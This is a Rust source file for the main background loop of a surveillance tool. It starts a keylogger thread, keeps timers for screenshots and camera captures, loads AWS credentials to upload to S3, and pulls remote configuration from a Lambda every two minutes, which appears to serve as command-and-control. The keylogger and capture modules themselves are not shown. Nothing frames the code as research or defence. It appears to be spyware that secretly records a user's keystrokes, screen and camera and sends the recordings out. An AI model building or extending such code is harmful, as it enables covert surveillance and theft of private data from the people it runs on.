// src/process/background.rs
use crate::get_config_from_lambda;
use crate::tasks::{process_all_tasks};
use crate::utils::instance::ensure_single_instance;
use std::error::Error;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};
use log::{error, info, debug};
use crate::tracker::TaskTracker;
use crate::config::ConfigAws;
use crate::logsetup::logging::cleanup_old_logs;
use crate::RUNNING;
use crate::s3upload::S3Uploader;
use crate::tasks::processor::TaskProcessor;

use crate::awscnf::credentials::CredentialsManager;

pub async fn start_background_process() -> Result<(), Box<dyn Error>> {
    let _lock_file = match ensure_single_instance() {
        Ok(file) => file,
        Err(e) => {
            eprintln!("Another instance is already running or failed to acquire lock: {}", e);
            return Ok(());
        }
    };

    // Schedule log cleanup
    std::thread::spawn(|| {
        loop {
            if let Err(e) = cleanup_old_logs("config/config.toml") {
                error!("Failed to cleanup old logs: {}", e);
            }
            // Check for cleanup every 24 hours
            std::thread::sleep(std::time::Duration::from_secs(24 * 60 * 60));
        }
    });


    info!("Starting background process...");

    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();

    if let Err(e) = ctrlc::set_handler(move || {
        info!("Received shutdown signal");
        r.store(false, Ordering::SeqCst);
        RUNNING.store(false, Ordering::SeqCst);
    }) {
        return Err(Box::new(e));
    }

    let mut last_screenshot_time = Instant::now();
    let mut last_camerashot_time = Instant::now();
    let mut last_upload_time = Instant::now();
    let task_tracker = TaskTracker::new();

    thread::spawn(move || {
        debug!("Starting keylogger thread");
        crate::keylogger::start_keylogging();
    });

    // Initialize credentials manager
    let credentials_manager = CredentialsManager::new();
    let aws_creds = match credentials_manager.get_credentials().await {
        Ok(creds) => {
            info!("AWS credentials loaded successfully");
            creds
        },
        Err(e) => {
            error!("Failed to load AWS credentials: {}", e);
            return Err(Box::new(std::io::Error::new(std::io::ErrorKind::Other, e.to_string())));
        }
    };

    let s3_uploader = match S3Uploader::new(
        aws_creds.region,
        &aws_creds.bucket_name,
        &aws_creds.access_key,
        &aws_creds.secret_key
    ).await {
        Ok(uploader) => {
            info!("S3 uploader initialized successfully");
            uploader
        },
        Err(e) => {
            error!("Failed to initialize S3 uploader: {}", e);
            return Err(Box::new(std::io::Error::new(std::io::ErrorKind::Other, e.to_string())));
        }
    };

    let mut last_config_check = Instant::now();
    let mut current_config = ConfigAws::default();
    let mut task_processor = TaskProcessor::new(s3_uploader).await?;

    while RUNNING.load(Ordering::SeqCst) {
        if last_config_check.elapsed() >= Duration::from_secs(120) {
            debug!("Checking for new configuration");
            match get_config_from_lambda().await {
                Ok(config) => {
                    info!("Retrieved new configuration");
                    current_config = config;
                    last_config_check = Instant::now();
                },
                Err(e) => {
                    error!("Failed to get configuration: {}", e);
                }
            }
        }

        if let Err(e) = process_all_tasks(&current_config, &task_tracker).await {
            error!("Error processing All tasks: {}", e);
        }

        if let Err(e) = task_processor.process_tasks(&current_config).await {
            error!("Error performing scheduled tasks: {}", e);
        }

        tokio::time::sleep(Duration::from_secs(60)).await;
    }

    info!("Background process shutting down");
    Ok(())
}